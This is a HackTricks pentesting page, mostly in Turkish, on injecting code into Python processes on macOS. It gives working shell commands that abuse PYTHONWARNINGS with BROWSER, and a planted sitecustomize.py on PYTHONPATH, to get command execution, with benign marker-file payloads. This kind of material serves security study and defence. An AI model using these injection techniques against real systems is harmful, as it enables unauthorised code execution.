# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` ve `BROWSER` environment variables aracılığıyla

Bir attacker Python process'inin environment'ını kontrol edebiliyorsa, `PYTHONWARNINGS` ve `BROWSER` kombinasyonu, Python hazırlanmış bir warning option'ını işlerken `antigravity` module'ünü import ettiğinde command execution'ı tetikleyebilir. Bu technique, `antigravity`'nin Python'ın `webbrowser` module'üyle bir URL açmasına ve bu module'ün `BROWSER` environment variable'ını dikkate almasına dayanır.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## `PYTHONPATH` ve `sitecustomize.py` Üzerinden

Normal başlangıç sırasında Python'un `site` modülü site'a özgü yolları ekler ve ardından `sitecustomize` adlı bir modülü import etmeyi dener. Saldırgan tarafından okunabilen bir dizini `PYTHONPATH` içinde ilk sıraya yerleştirerek, process environment'ını kontrol eden bir saldırgan Python'un hedef script'ten önce bir payload import etmesini sağlayabilir. `-S` flag'i otomatik `site` initialization işlemini devre dışı bırakırken, isolated mode (`-I`) `PYTHONPATH`'i yok sayar ve `-s` ile `-E` seçeneklerini etkinleştirir.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [Environment Variables ile Hacking - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Site-specific configuration hook](https://docs.python.org/3/library/site.html)
- [3] [Python command-line and environment](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
